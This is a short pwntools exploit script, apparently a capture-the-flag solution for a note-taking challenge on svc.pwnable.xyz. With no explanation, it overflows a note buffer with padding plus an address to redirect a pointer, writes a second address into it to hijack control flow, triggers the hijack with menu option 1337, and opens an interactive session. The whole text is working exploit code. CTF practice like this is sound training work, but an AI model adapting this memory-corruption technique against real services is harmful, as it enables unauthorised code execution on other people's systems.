from pwn import *

r = remote('svc.pwnable.xyz', 30030)

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'note: ', b'40')
r.sendlineafter(b'title: ', b'N0_Sp3c14l_Ch4r')
r.sendafter(b'note: ', b'A' * 32 + p32(0x602020))


r.sendlineafter(b'> ', b'3')
r.sendlineafter(b' ', b'0')

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'note: ', b'40')
r.sendlineafter(b'title: ', b'N0_Sp3c14l_Ch4r')
r.sendlineafter(b'note: ', p64(0x40096c))

r.sendlineafter(b'> ', b'1337')

r.interactive()
